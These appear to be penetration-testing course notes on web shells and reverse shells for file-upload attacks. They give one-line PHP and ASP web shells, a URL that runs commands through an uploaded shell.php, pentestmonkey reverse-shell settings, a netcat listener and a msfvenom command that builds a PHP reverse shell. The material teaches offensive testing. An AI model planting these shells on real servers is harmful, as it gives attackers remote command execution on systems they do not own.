## Web Shells

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/opt/useful/seclists/Web-Shells` directory in `PwnBox`.

---

## Writing Custom Web Shell

```php
<?php system($_REQUEST['cmd']); ?>
```

```bash
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

Web shells are not exclusive to `PHP`, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. For `.NET` web applications, we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function, and it should also execute the command specified in `?cmd=` and print its output, as follows:

```asp
<% eval request('cmd') %>
```

In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.

---

## Reverse Shell

 One reliable reverse shell for `PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. Furthermore, the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.

```php
$ip = 'OUR_IP'; // CHANGE THIS 
$port = OUR_PORT; // CHANGE THIS
```

```shell
nc -lvnp OUR_PORT
```

---
## Generating Custom Reverse Shell Scripts

```shell
 msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the `-p` flag and specify the output language with the `-f` flag.



